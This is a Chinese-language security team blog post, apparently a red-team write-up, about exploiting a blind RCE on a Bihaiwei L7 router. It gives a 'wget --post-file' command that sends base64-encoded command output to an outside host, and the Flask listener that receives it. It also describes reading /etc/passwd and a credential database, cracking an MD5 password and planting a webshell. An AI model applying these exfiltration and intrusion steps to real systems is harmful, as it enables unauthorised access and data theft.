#  记录一次RCE无回显突破内网隔离   
原创 BeoutSea  RongRui安全团队   2024-12-22 17:21  
  
在攻防演练的时候常常遇到无回显的情况，怎么办呢？你还在用DNSLog外带内容？还是在用文件写入Web访问读取？  
  
在某次攻防演练我遇到了一个无回显的漏洞，DNSLog外带也不是很好用啊，无奈只能自己研究了  
# 发现碧海威科技-L7云路由  
  
首先通过公开的  
nday  
漏洞进行测试 是否存在  
  
漏洞  
POC  
可以查看 小羊安全屋的公众号  
  
https://mp.weixin.qq.com/s/oF1cydiyO92LVgJuyRKjvQ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9ib8fvbibIVmYfJlDEAibudT4xicP4Hmr0TXEBHnYxkdYJDm7zOSxalIluw/640?wx_fmt=png&from=appmsg "")  
  
然后通过  
``  
执行命令带出来 自己服务器开启  
python-web  
发现有命令回显但是回显内容有问题，只显示第一行的内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9Eyofp0IDaHFVf5qibicQ0zq1ibdM6ibC3jWEuJCRia1v03SjotxHJj8zPAA/640?wx_fmt=png&from=appmsg "")  
  
尝试将执行的命令进行  
base64  
编码进行回显，发现没有回显内容，经过测试路由器被阉割了所有没有  
base64  
这个功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9qRNNYx7dfFuAvcrMM2hByiamBBic87cTcicpH3QC9PQkLA5jQl2ibdRpwA/640?wx_fmt=png&from=appmsg "")  
  
但是  
openssl  
是有的 通过  
openssl  
进行  
base64  
编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9TKfFMAHPwyIxlrY2wJBHvxnV585HtEakXHAJibtAwTUK9pJ6Fphdmag/640?wx_fmt=png&from=appmsg "")  
  
OK  
命令带出来了 拿到了  
id  
执行的内容，但是执行  
cat /etc/passwd  
的时候回显还是缺少东西。并且测试没有  
curl  
命令，  
web  
根目录没有写入  
webshell  
的权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9KrarEX9J39Hv2Sh1kRGuopgZRGV1279FiaxX5b73wHWFUepcYdJ7rew/640?wx_fmt=png&from=appmsg "")  
  
测试发现  
/tmp  
目录有写入权限 那我们可以通过  
wget  
的特性读取文件进行  
post  
发送  
  
首先将执行的命令  
base64  
编码写入到  
/tmp/1.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9tNic11KrEoc3sdBsyCVEbe1LugOnyxOg0MF01qZTnzmicmiajSKQkQiaibA/640?wx_fmt=png&from=appmsg "")  
  
然后编写  
Python  
脚本  
flask  
接收  
POST  
数据  
  
代码如下  
```
from flask import Flask, request
import base64

app = Flask(__name__)

def basedecode(encoded_data):
    padding = len(encoded_data) % 4
    if padding != 0:
        encoded_data += '=' * (4 - padding)
    try:
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
        print('-' * 50)
        print(decoded_data)
        print('-' * 50)
    except Exception as e:
        print("Error decoding Base64 data:", e)
        
@app.route('/', methods=['GET','POST'])
def handle_post():
    data = request.form
    result = '&'.join(f'{key}{value}'
    for key, value in data.items())
        result = result.replace('\n','')
        basedecode(result)
    return 'ok'
 
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
```  
  
通过  
python  
启动  
web  
  
在通过  
wget  
的特性读取  
/tmp/1.txt  
进行发送成功拿到回显内容  
  
wget –post-file=/tmp/1.txthttp://x.x.x.x/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9ArnAfufR11B8AUykDNfrhm5RN3qTGajJHPhbKm6nZgaCz5UGgYBrJw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9cUicLIzxEGk5nibCC9ib67Hzxa3mC2jHZLNneGNu3XzyO135BGHic31kGg/640?wx_fmt=png&from=appmsg "")  
  
但是还是不能写入  
webshell  
怎么办呢？通过探测后台有一个命令控制台是  
root  
权限  
  
Web登录  
去  
/usr/hls/etc/passwd.db  
查询数据库内容，改一下代码，读取  
passwd.db  
文件  
base64  
输出，通过  
python  
脚本解密成  
1.db  
在本地连接  
sqlite  
进入后台  
  
这个过程同上面差不多就不细说了。  
  
最后拿到  
md5  
加密的密码进行解密。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9o9Yfrc7pfYOp5RBuw4Z6cq9HAuJ9Kia25auIMPFicWcOfbIyz68ib6yVw/640?wx_fmt=png&from=appmsg "")  
  
通过公开的漏洞后台有命令控制台可以执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9o9X7MIibplaGoxv9fnkPzX3icdNSBvpR8MH7xUaNr5qEcodqZoCXAxOg/640?wx_fmt=png&from=appmsg "")  
  
cd  
到  
web  
根目录  
wget  
下载  
webshell  
进行连接，  
OK  
突破隔离进入内网，开干吧  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hY0hFWicNLlwjN6jkoIibWIefM67Yh4wM9ocsrgzqZWfVaia0kOiaSrB4JEJuKUdUaaq9ZzHPJYhcYSyF98zgMX9IQ/640?wx_fmt=png&from=appmsg "")  
  
感谢关注RongRui科技，技术交流私信拉群  
  
承接项目：软件开发、web开发、攻防演练、等保测评等  
  
进群+V：BeoutSea   （备注：进群）  
  
  
